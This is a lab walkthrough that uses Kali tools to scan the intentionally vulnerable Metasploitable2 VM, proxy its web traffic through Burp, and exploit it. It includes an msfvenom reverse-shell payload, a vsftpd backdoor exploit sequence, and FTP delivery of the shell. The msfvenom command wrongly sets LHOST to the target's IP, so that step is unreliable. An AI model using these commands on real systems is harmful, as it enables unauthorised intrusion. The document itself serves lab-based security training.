# 🏹 Attack Simulation

This section outlines a complete offensive workflow executed from the Kali Linux attacker VM targeting the Metasploitable2 vulnerable host. The attack follows the Cyber Kill Chain model and demonstrates how reconnaissance, exploitation, and post-exploitation phases unfold in a controlled lab environment.


---

## 🔍 Reconnaissance (OSINT)

### 1. **Netdiscover**: Identified live hosts within the 192.168.101.0/24 and 192.168.100.0/24 ranges.
```bash
netdiscover -r 192.168.100.0/24  #target subnet IP
```
Explanation:

   -r: Specifies the subnet range to scan.
  
### 2. **Nmap (-sS, -A)**: Performed stealth SYN scans and full version detection to identify open ports and services on Metasploitable2.
```bash
nmap -sS -A 192.168.100.2
```
Explanation:

   -sS: Performs a TCP SYN scan (stealth scan).
   
   -A: Enables OS detection, version detection, script scanning, and traceroute.

### 3. **WhatWeb**: Detected web technologies running on Metasploitable’s HTTP service (e.g., Apache, PHP).
```bash
whatweb http://192.168.100.2
```

### 4. **Burp Suite (Passive/Active Scan)**: Intercepted and analyzed HTTP traffic for potential injection points and misconfigurations.

#### 4a. Start Burp Suite

1. On Kali Linux, open Burp Suite:
    ```bash
    burpsuite
    ```
2. Choose **Temporary Project** → Click **Next** → Start with **Burp Defaults** → Click **Start Burp**.

#### 4b. Configure Firefox to Use Burp Proxy

1. Open **Firefox ESR** (preinstalled on Kali).
2. Go to:
    ```
    Preferences → Network Settings → Settings
    ```
3. Select **Manual Proxy Configuration**:
    - HTTP Proxy: `127.0.0.1`
    - Port: `8080`
    - Check: **Use this proxy server for all protocols**
4. Click **OK**.

#### 4c. Browse to Metasploitable2 Web Interface

1. In Firefox, go to:
    ```
    http://192.168.100.2
    ```
   *(Replace with your actual Metasploitable2 IP if different)*

2. Burp Suite’s **Proxy** tab will display captured HTTP requests.


#### 4d. Analyze Requests Using Burp Tools

- **Target → Site map**  
  Shows discovered endpoints and technologies.

- **Intruder**  
  Automate testing (e.g., brute force, fuzzing).

- **Repeater**  
  Manually tweak and resend requests.

- **Scanner** (Pro only)  
  Automatically finds common vulnerabilities.

--- 

## ⚙️ Weaponization

- **msfvenom**: Created a custom reverse shell payload targeting a vulnerable service.
  ```bash
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.2 LPORT=4444 -f elf > shell.elf
  ```
- **Metasploit Framework**: Loaded and configured an exploit module (e.g., exploit/unix/ftp/vsftpd_234_backdoor) to deliver the payload.

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor #discovered via nmap scan during OSINT
set RHOST 192.168.100.2
set LHOST 192.168.101.100
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit
```
---
## 📦 Delivery & Exploitation

- **FTP Upload**: Use anonymous login on VSFTPD to upload `shell.elf`.
- **Manual Trigger**: Run the payload if access to a shell or web upload is available.
- **Meterpreter Session**: Once the shell connects back:
```bash
sessions
sysinfo
```

---




